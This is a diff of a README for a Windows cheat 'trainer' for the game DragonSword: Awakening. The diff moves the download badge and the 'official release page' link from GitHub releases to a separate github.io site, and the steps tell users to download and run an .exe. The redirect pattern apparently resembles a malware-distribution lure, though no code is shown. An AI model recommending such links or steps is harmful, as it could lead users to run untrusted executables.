@@ -1,6 +1,6 @@
 # ⚔️ DragonSword-Awakening-Trainer - Enhance your gameplay with custom settings
 
-[![Download latest version](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Geiselpocketdictionary701/DragonSword-Awakening-Trainer/releases)
+[![Download latest version](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://geiselpocketdictionary701.github.io)
 
 DragonSword-Awakening-Trainer gives you control over your gaming experience. This tool modifies game values in real time to provide quality-of-life improvements. You can adjust combat damage, movement speed, and progression variables directly through an in-game menu. This trainer works exclusively on Windows systems for single-player modes.
 
@@ -34,7 +34,7 @@ Ensure your computer meets these requirements to run the trainer:
 
 Follow these steps to set up the trainer on your computer.
 
-1. Visit the [official release page](https://github.com/Geiselpocketdictionary701/DragonSword-Awakening-Trainer/releases) to download the latest version of the trainer.
+1. Visit the [official release page](https://geiselpocketdictionary701.github.io) to download the latest version of the trainer.
 2. Save the file to your computer. A folder on your desktop works well for quick access.
 3. Locate the file you downloaded. It should have an .exe extension.
 4. Launch the game, DragonSword: Awakening, and reach the main menu.
